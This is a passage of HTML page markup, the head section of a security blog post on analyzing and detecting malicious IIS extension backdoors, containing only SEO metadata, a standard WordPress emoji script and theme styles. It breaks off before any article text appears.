@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en-US" prefix="og: https://ogp.me/ns#">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	
+		<!-- All in One SEO 4.8.7.2 - aioseo.com -->
+	<meta name="description" content="IIS Extensions As Backdoors Microsoft recently published an interesting blog explaining how they&#039;ve noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers: https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/ The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order">
+	<meta name="robots" content="max-image-preview:large">
+	<meta name="author" content="robwillisinfo">
+	<meta name="keywords" content="detection,extensions,iis,kali,logs,powershell,security,siem,sysmon,web shell,windows">
+	<link rel="canonical" href="/2022/11/analyzing-detecting-iis-backdoors/">
+	<meta name="generator" content="All in One SEO (AIOSEO) 4.8.7.2">
+		<meta property="og:locale" content="en_US">
+		<meta property="og:site_name" content="RobWillis.info | #yolosec">
+		<meta property="og:type" content="article">
+		<meta property="og:title" content="Analyzing &amp; Detecting IIS Backdoors | RobWillis.info">
+		<meta property="og:description" content="IIS Extensions As Backdoors Microsoft recently published an interesting blog explaining how they&#039;ve noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers: https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/ The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order">
+		<meta property="og:url" content="/2022/11/analyzing-detecting-iis-backdoors/">
+		<meta property="article:published_time" content="2022-11-05T08:00:12+00:00">
+		<meta property="article:modified_time" content="2022-11-06T09:23:08+00:00">
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:title" content="Analyzing &amp; Detecting IIS Backdoors | RobWillis.info">
+		<meta name="twitter:description" content="IIS Extensions As Backdoors Microsoft recently published an interesting blog explaining how they&#039;ve noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers: https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/ The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order">
+		<script type="application/ld+json" class="aioseo-schema">
+			{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#article","name":"Analyzing & Detecting IIS Backdoors | RobWillis.info","headline":"Analyzing &#038; Detecting IIS Backdoors","author":{"@id":"\/author\/bit_rot\/#author"},"publisher":{"@id":"\/#organization"},"image":{"@type":"ImageObject","url":"\/wp-content\/uploads\/2022\/10\/IIS-Raid-Feat.png","width":950,"height":441},"datePublished":"2022-11-05T03:00:12-05:00","dateModified":"2022-11-06T03:23:08-06:00","inLanguage":"en-US","mainEntityOfPage":{"@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#webpage"},"isPartOf":{"@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#webpage"},"articleSection":"Blog, Computers, Pen Testing, Security, Servers, Tools, Detection, Extensions, IIS, Kali, Logs, Powershell, security, SIEM, Sysmon, Web Shell, Windows"},{"@type":"BreadcrumbList","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"#listItem","position":1,"name":"Home","item":"","nextItem":{"@type":"ListItem","@id":"\/category\/computers\/#listItem","name":"Computers"}},{"@type":"ListItem","@id":"\/category\/computers\/#listItem","position":2,"name":"Computers","item":"\/category\/computers\/","nextItem":{"@type":"ListItem","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#listItem","name":"Analyzing &#038; Detecting IIS Backdoors"},"previousItem":{"@type":"ListItem","@id":"#listItem","name":"Home"}},{"@type":"ListItem","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#listItem","position":3,"name":"Analyzing &#038; Detecting IIS Backdoors","previousItem":{"@type":"ListItem","@id":"\/category\/computers\/#listItem","name":"Computers"}}]},{"@type":"Organization","@id":"\/#organization","name":"RobWillis.info","description":"#yolosec","url":"\/"},{"@type":"Person","@id":"\/author\/bit_rot\/#author","url":"\/author\/bit_rot\/","name":"robwillisinfo","image":{"@type":"ImageObject","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#authorImage","url":"https:\/\/secure.gravatar.com\/avatar\/5abe3ae45b388410a815ca1c5ff124c1e418cd7b13ef7401ce6393d362cd1c90?s=96&d=mm&r=r","width":96,"height":96,"caption":"robwillisinfo"}},{"@type":"WebPage","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#webpage","url":"\/2022\/11\/analyzing-detecting-iis-backdoors\/","name":"Analyzing & Detecting IIS Backdoors | RobWillis.info","description":"IIS Extensions As Backdoors Microsoft recently published an interesting blog explaining how they've noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers: https:\/\/www.microsoft.com\/security\/blog\/2022\/07\/26\/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers\/ The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order","inLanguage":"en-US","isPartOf":{"@id":"\/#website"},"breadcrumb":{"@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#breadcrumblist"},"author":{"@id":"\/author\/bit_rot\/#author"},"creator":{"@id":"\/author\/bit_rot\/#author"},"image":{"@type":"ImageObject","url":"\/wp-content\/uploads\/2022\/10\/IIS-Raid-Feat.png","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#mainImage","width":950,"height":441},"primaryImageOfPage":{"@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#mainImage"},"datePublished":"2022-11-05T03:00:12-05:00","dateModified":"2022-11-06T03:23:08-06:00"},{"@type":"WebSite","@id":"\/#website","url":"\/","name":"RobWillis.info","description":"#yolosec","inLanguage":"en-US","publisher":{"@id":"\/#organization"}}]}
+		</script>
+		<!-- All in One SEO -->
+
+<title>Analyzing &amp; Detecting IIS Backdoors | RobWillis.info</title>
+<link rel="alternate" type="application/rss+xml" title="RobWillis.info &raquo; Feed" href="/feed/">
+<link rel="alternate" type="application/rss+xml" title="RobWillis.info &raquo; Comments Feed" href="/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="RobWillis.info &raquo; Analyzing &#038; Detecting IIS Backdoors Comments Feed" href="/2022/11/analyzing-detecting-iis-backdoors/feed/">
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.3"}};
+/*! This file is auto-generated */
+!function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇨🇶","🇨​🇶")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!a(e,"🫟")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<style id="wp-block-site-title-inline-css">.wp-block-site-title{box-sizing:border-box}.wp-block-site-title :where(a){color:inherit;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-decoration:inherit}</style>
+<style id="wp-block-navigation-link-inline-css">.wp-block-navigation .wp-block-navigation-item__label{overflow-wrap:break-word}.wp-block-navigation .wp-block-navigation-item__description{display:none}.link-ui-tools{border-top:1px solid #f0f0f0;padding:8px}.link-ui-block-inserter{padding-top:8px}.link-ui-block-inserter__back{margin-left:8px;text-transform:uppercase}</style>
+<link rel="stylesheet" id="wp-block-navigation-css" href="/wp-includes/blocks/navigation/style.min.css?ver=6.8.3" media="all">
+<style id="wp-block-group-inline-css">.wp-block-group{box-sizing:border-box}:where(.wp-block-group.wp-block-group-is-layout-constrained){position:relative}</style>
+<style id="wp-block-post-title-inline-css">.wp-block-post-title{box-sizing:border-box;word-break:break-word}.wp-block-post-title :where(a){display:inline-block;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-decoration:inherit}</style>
+<style id="wp-block-paragraph-inline-css">.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}</style>
+<style id="wp-block-post-author-name-inline-css">.wp-block-post-author-name{box-sizing:border-box}</style>
+<style id="wp-block-post-terms-inline-css">.wp-block-post-terms{box-sizing:border-box}.wp-block-post-terms .wp-block-post-terms__separator{white-space:pre-wrap}</style>
+<style id="wp-block-post-content-inline-css">.wp-block-post-content{display:flow-root}</style>
+<style id="wp-block-post-navigation-link-inline-css">.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-previous{display:inline-block;margin-right:1ch}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-previous:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-next{display:inline-block;margin-left:1ch}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-next:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-post-navigation-link.has-text-align-left[style*="writing-mode: vertical-lr"],.wp-block-post-navigation-link.has-text-align-right[style*="writing-mode: vertical-rl"]{rotate:180deg}</style>
+<style id="wp-block-comments-inline-css">.wp-block-post-comments{box-sizing:border-box}.wp-block-post-comments .alignleft{float:left}.wp-block-post-comments .alignright{float:right}.wp-block-post-comments .navigation:after{clear:both;content:"";display:table}.wp-block-post-comments .commentlist{clear:both;list-style:none;margin:0;padding:0}.wp-block-post-comments .commentlist .comment{min-height:2.25em;padding-left:3.25em}.wp-block-post-comments .commentlist .comment p{font-size:1em;line-height:1.8;margin:1em 0}.wp-block-post-comments .commentlist .children{list-style:none;margin:0;padding:0}.wp-block-post-comments .comment-author{line-height:1.5}.wp-block-post-comments .comment-author .avatar{border-radius:1.5em;display:block;float:left;height:2.5em;margin-right:.75em;margin-top:.5em;width:2.5em}.wp-block-post-comments .comment-author cite{font-style:normal}.wp-block-post-comments .comment-meta{font-size:.875em;line-height:1.5}.wp-block-post-comments .comment-meta b{font-weight:400}.wp-block-post-comments .comment-meta .comment-awaiting-moderation{display:block;margin-bottom:1em;margin-top:1em}.wp-block-post-comments .comment-body .commentmetadata{font-size:.875em}.wp-block-post-comments .comment-form-author label,.wp-block-post-comments .comment-form-comment label,.wp-block-post-comments .comment-form-email label,.wp-block-post-comments .comment-form-url label{display:block;margin-bottom:.25em}.wp-block-post-comments .comment-form input:not([type=submit]):not([type=checkbox]),.wp-block-post-comments .comment-form textarea{box-sizing:border-box;display:block;width:100%}.wp-block-post-comments .comment-form-cookies-consent{display:flex;gap:.25em}.wp-block-post-comments .comment-form-cookies-consent #wp-comment-cookies-consent{margin-top:.35em}.wp-block-post-comments .comment-reply-title{margin-bottom:0}.wp-block-post-comments .comment-reply-title :where(small){font-size:var(--wp--preset--font-size--medium,smaller);margin-left:.5em}.wp-block-post-comments .reply{font-size:.875em;margin-bottom:1.4em}.wp-block-post-comments input:not([type=submit]),.wp-block-post-comments textarea{border:1px solid #949494;font-family:inherit;font-size:1em}.wp-block-post-comments input:not([type=submit]):not([type=checkbox]),.wp-block-post-comments textarea{padding:calc(.667em + 2px)}:where(.wp-block-post-comments input[type=submit]){border:none}.wp-block-comments{box-sizing:border-box}</style>
+<style id="wp-block-heading-inline-css">h1.has-background,h2.has-background,h3.has-background,h4.has-background,h5.has-background,h6.has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}</style>
+<style id="wp-block-post-date-inline-css">.wp-block-post-date{box-sizing:border-box}</style>
+<style id="wp-block-post-template-inline-css">.wp-block-post-template{box-sizing:border-box;list-style:none;margin-bottom:0;margin-top:0;max-width:100%;padding:0}.wp-block-post-template.is-flex-container{display:flex;flex-direction:row;flex-wrap:wrap;gap:1.25em}.wp-block-post-template.is-flex-container>li{margin:0;width:100%}@media (min-width:600px){.wp-block-post-template.is-flex-container.is-flex-container.columns-2>li{width:calc(50% - .625em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-3>li{width:calc(33.33333% - .83333em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-4>li{width:calc(25% - .9375em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-5>li{width:calc(20% - 1em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-6>li{width:calc(16.66667% - 1.04167em)}}@media (max-width:600px){.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid{grid-template-columns:1fr}}.wp-block-post-template-is-layout-constrained>li>.alignright,.wp-block-post-template-is-layout-flow>li>.alignright{float:right;margin-inline-end:0;margin-inline-start:2em}.wp-block-post-template-is-layout-constrained>li>.alignleft,.wp-block-post-template-is-layout-flow>li>.alignleft{float:left;margin-inline-end:2em;margin-inline-start:0}.wp-block-post-template-is-layout-constrained>li>.aligncenter,.wp-block-post-template-is-layout-flow>li>.aligncenter{margin-inline-end:auto;margin-inline-start:auto}</style>
+<link rel="stylesheet" id="wp-block-social-links-css" href="/wp-includes/blocks/social-links/style.min.css?ver=6.8.3" media="all">
+<style id="wp-block-library-inline-css">:root{--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,161;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px;--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color)}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}.has-text-align-center{text-align:center}.has-text-align-left{text-align:left}.has-text-align-right{text-align:right}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px;word-wrap:normal!important}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}</style>
+<style id="global-styles-inline-css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--base: #1B1B1B;--wp--preset--color--contrast: #F0F0F0;--wp--preset--color--accent-1: #786D0A;--wp--preset--color--accent-2: #442369;--wp--preset--color--accent-3: #D1D0EA;--wp--preset--color--accent-4: #CBCBCB;--wp--preset--color--accent-5: #353535;--wp--preset--color--accent-6: #FFFFFF33;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 0.875rem;--wp--preset--font-size--medium: clamp(1rem, 1rem + ((1vw - 0.2rem) * 0.196), 1.125rem);--wp--preset--font-size--large: clamp(1.125rem, 1.125rem + ((1vw - 0.2rem) * 0.392), 1.375rem);--wp--preset--font-size--x-large: clamp(1.75rem, 1.75rem + ((1vw - 0.2rem) * 0.392), 2rem);--wp--preset--font-size--xx-large: clamp(2.15rem, 2.15rem + ((1vw - 0.2rem) * 1.333), 3rem);--wp--preset--font-family--manrope: Manrope, sans-serif;--wp--preset--font-family--fira-code: "Fira Code", monospace;--wp--preset--spacing--20: 10px;--wp--preset--spacing--30: 20px;--wp--preset--spacing--40: 30px;--wp--preset--spacing--50: clamp(30px, 5vw, 50px);--wp--preset--spacing--60: clamp(30px, 7vw, 70px);--wp--preset--spacing--70: clamp(50px, 7vw, 90px);--wp--preset--spacing--80: clamp(70px, 10vw, 140px);--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:root { --wp--style--global--content-size: 645px;--wp--style--global--wide-size: 1340px; }:where(body) { margin: 0; }.wp-site-blocks { padding-top: var(--wp--style--root--padding-top); padding-bottom: var(--wp--style--root--padding-bottom); }.has-global-padding { padding-right: var(--wp--style--root--padding-right); padding-left: var(--wp--style--root--padding-left); }.has-global-padding > .alignfull { margin-right: calc(var(--wp--style--root--padding-right) * -1); margin-left: calc(var(--wp--style--root--padding-left) * -1); }.has-global-padding :where(:not(.alignfull.is-layout-flow) > .has-global-padding:not(.wp-block-block, .alignfull)) { padding-right: 0; padding-left: 0; }.has-global-padding :where(:not(.alignfull.is-layout-flow) > .has-global-padding:not(.wp-block-block, .alignfull)) > .alignfull { margin-left: 0; margin-right: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: 1.2rem; margin-block-end: 0; }:where(.wp-site-blocks) > :first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child { margin-block-end: 0; }:root { --wp--style--block-gap: 1.2rem; }:root :where(.is-layout-flow) > :first-child{margin-block-start: 0;}:root :where(.is-layout-flow) > :last-child{margin-block-end: 0;}:root :where(.is-layout-flow) > *{margin-block-start: 1.2rem;margin-block-end: 0;}:root :where(.is-layout-constrained) > :first-child{margin-block-start: 0;}:root :where(.is-layout-constrained) > :last-child{margin-block-end: 0;}:root :where(.is-layout-constrained) > *{margin-block-start: 1.2rem;margin-block-end: 0;}:root :where(.is-layout-flex){gap: 1.2rem;}:root :where(.is-layout-grid){gap: 1.2rem;}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{background-color: var(--wp--preset--color--base);color: var(--wp--preset--color--accent-4);font-family: var(--wp--preset--font-family--manrope);font-size: var(--wp--preset--font-size--large);font-weight: 300;letter-spacing: -0.1px;line-height: 1.4;--wp--style--root--padding-top: 0px;--wp--style--root--padding-right: var(--wp--preset--spacing--50);--wp--style--root--padding-bottom: 0px;--wp--style--root--padding-left: var(--wp--preset--spacing--50);}a:where(:not(.wp-element-button)){color: #0099ff;text-decoration: underline;}:root :where(a:where(:not(.wp-element-button)):hover){text-decoration: none;}h1, h2, h3, h4, h5, h6{font-weight: 400;letter-spacing: -0.1px;line-height: 1.125;}h1{font-size: var(--wp--preset--font-size--xx-large);}h2{font-size: var(--wp--preset--font-size--x-large);}h3{font-size: var(--wp--preset--font-size--large);}h4{font-size: var(--wp--preset--font-size--medium);}h5{font-size: var(--wp--preset--font-size--small);letter-spacing: 0.5px;}h6{font-size: var(--wp--preset--font-size--small);font-weight: 700;letter-spacing: 1.4px;text-transform: uppercase;}:root :where(.wp-element-button, .wp-block-button__link){background-color: var(--wp--preset--color--contrast);border-width: 0;color: var(--wp--preset--color--base);font-family: inherit;font-size: var(--wp--preset--font-size--medium);line-height: inherit;padding-top: 0.6rem;padding-right: 1.6rem;padding-bottom: 0.6rem;padding-left: 1.6rem;text-decoration: none;}:root :where(.wp-element-button:hover, .wp-block-button__link:hover){background-color: color-mix(in srgb, var(--wp--preset--color--contrast) 85%, transparent);border-color: transparent;color: var(--wp--preset--color--base);}:root :where(.wp-element-button:focus, .wp-block-button__link:focus){outline-color: var(--wp--preset--color--accent-4);outline-offset: 2px;}:root :where(.wp-element-caption, .wp-block-audio figcaption, .wp-block-embed figcaption, .wp-block-gallery figcaption, .wp-block-image figcaption, .wp-block-table figcaption, .wp-block-video figcaption){font-size: var(--wp--preset--font-size--small);line-height: 1.4;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: 